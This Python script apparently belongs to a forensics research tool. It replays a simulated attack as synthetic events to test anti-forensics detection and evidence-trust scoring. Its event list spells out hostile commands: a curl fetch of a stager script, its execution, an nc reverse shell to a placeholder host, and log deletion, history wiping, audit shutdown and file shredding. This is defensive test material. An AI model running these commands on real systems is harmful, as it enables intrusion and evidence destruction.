"""
CHRONOS-FL — Interactive Attack & Anti-Forensics Simulation.
"""

from __future__ import annotations
import time
from chronos.system.collector import EvidenceCollector
from chronos.system.snapshot_recorder import SnapshotRecorder
from chronos.system.ledger_storage import EvidenceLedgerStorage
from chronos.research.timeline_engine import TimelineEngine
from chronos.research.causality_engine import CausalityEngine
from chronos.research.detection_engine import AntiForensicsDetectionEngine
from chronos.research.trust_engine import TrustAnalysisEngine
from chronos.shared.models import EventType, Event


def run_attack_simulation() -> None:
    print("=" * 80)
    print("      🔥 CHRONOS-FL — REAL-TIME ATTACK & ANTI-FORENSICS SIMULATOR")
    print("=" * 80)

    collector = EvidenceCollector(host_id="victim_host_01")
    timeline_engine = TimelineEngine()
    causality_engine = CausalityEngine(host_id="victim_host_01")
    detection_engine = AntiForensicsDetectionEngine()
    snapshot_recorder = SnapshotRecorder()
    ledger_storage = EvidenceLedgerStorage(chunk_size=2)
    trust_engine = TrustAnalysisEngine()

    detection_engine.register_alert_callback(snapshot_recorder.on_anti_forensic_alert)

    def bus(event: Event):
        timeline_engine.add_event(event)
        causality_engine.ingest_event(event)
        detection_engine.analyze_event(event)
        ledger_storage.add_event(event)

    collector.register_listener(bus)

    attack_steps = [
        ("09:01:00", EventType.EXECVE.value, 1001, "sshd", "sshd: root@pts/1", None, None, None, "Phase 1: Initial Access"),
        ("09:02:15", EventType.EXECVE.value, 1002, "curl", "curl -s http://198.51.100.99/stager.sh -o /tmp/stager.sh", "/tmp/stager.sh", None, None, "Phase 2: Payload Ingress"),
        ("09:03:00", EventType.EXECVE.value, 1003, "bash", "bash /tmp/stager.sh", "/tmp/stager.sh", None, None, "Phase 3: Execution"),
        ("09:04:10", EventType.CONNECT.value, 1004, "nc", "nc -e /bin/bash 198.51.100.99 4444", None, "198.51.100.99", 4444, "Phase 4: C2 Reverse Shell"),
        ("09:05:00", EventType.EXECVE.value, 1005, "rm", "rm -rf /var/log/*", "/var/log/syslog", None, None, "Phase 5: Anti-Forensics - Log Deletion"),
        ("09:05:30", EventType.EXECVE.value, 1006, "bash", "history -c", None, None, None, "Phase 5: Anti-Forensics - History Wiping"),
        ("09:06:00", EventType.EXECVE.value, 1007, "systemctl", "systemctl stop auditd", None, None, None, "Phase 5: Anti-Forensics - Audit Shutdown"),
        ("09:06:30", EventType.EXECVE.value, 1008, "shred", "shred -u /tmp/stager.sh", "/tmp/stager.sh", None, None, "Phase 5: Anti-Forensics - Secure Wiping"),
    ]

    for time_str, evt_type, pid, comm, cmdline, target_path, target_ip, target_port, phase in attack_steps:
        print(f"\n[SIM STEP] {time_str} | {phase}")
        print(f"           Command: {cmdline}")

        collector.record_event(
            event_type=evt_type,
            pid=pid,
            ppid=1001,
            user="root",
            comm=comm,
            cmdline=cmdline,
            target_path=target_path,
            target_ip=target_ip,
            target_port=target_port,
            evidence_source="Simulated eBPF Sensor",
        )
        time.sleep(0.3)

    ledger_storage.commit_chunk()
    is_valid, issues = ledger_storage.verify_integrity()

    print("\n" + "=" * 80)
    print("                     SIMULATION FINAL TRUST ANALYSIS")
    print("=" * 80)
    ess = trust_engine.compute_ess(detection_engine.alerts)
    tcs = trust_engine.compute_tcs(ess, detection_engine.alerts, ledger_valid=is_valid)

    print(f"\n  Surviving Evidence (ESS): {ess.ess_score:.1f}%")
    print(f"  Timeline Trust    (TCS): {tcs.tcs_score:.1f}% ({tcs.confidence_level})")
    print(f"  Alerts Fired:          {len(detection_engine.alerts)}")
    print(f"  Snapshots Captured:    {len(snapshot_recorder.snapshots)}")
    print(f"  Ledger Hash Chain:     {'INTACT' if is_valid else 'CORRUPTED'}")


if __name__ == "__main__":
    run_attack_simulation()
